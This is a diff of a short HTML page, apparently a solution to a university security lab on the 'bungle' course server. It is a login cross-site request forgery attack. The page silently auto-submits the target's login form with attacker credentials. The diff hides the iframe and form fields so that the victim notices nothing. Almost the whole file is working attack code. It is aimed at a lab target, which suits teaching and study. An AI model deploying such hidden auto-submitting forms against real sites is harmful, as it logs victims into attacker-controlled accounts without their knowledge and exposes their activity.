@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
-  <iframe name="Z" src="http://bungle-cs461.csl.illinois.edu"></iframe>
-  <form action="http://bungle-cs461.csl.illinois.edu/login" method="POST">
-    <input id="username" name="username" type="text" value="attacker">
-    <input id="userpass" name="password" type="password" value="l33th4x">
+  <iframe name="Z" src="http://bungle-cs461.csl.illinois.edu" width="0" height="0" frameborder="0"></iframe>
+  <form action="http://bungle-cs461.csl.illinois.edu/login" method="POST" target="Z">
+    <input id="username" name="username" type="text" value="attacker" style="display: none">
+    <input id="userpass" name="password" type="password" value="l33th4x" style="display: none">
   </form>
 <script>
   document.forms[0].submit()
